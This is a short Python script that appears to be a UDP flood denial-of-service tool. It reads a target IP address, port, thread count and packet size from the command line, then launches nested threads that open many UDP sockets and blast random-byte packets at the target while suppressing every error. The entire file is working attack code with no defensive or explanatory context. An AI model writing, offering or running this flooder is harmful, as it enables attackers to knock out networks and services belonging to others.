import socket,threading,sys,os

def UDP_ATTACK(s,size,addr):
    try:
        for _ in range(2500):[s.sendto(os.urandom(size),addr) for _ in range(15)]
    except:
       pass

def SOC(addr,size):
  try:
     for _ in range(250):
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
  except:pass

ip,port,thread,size = sys.argv[1], int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
[threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]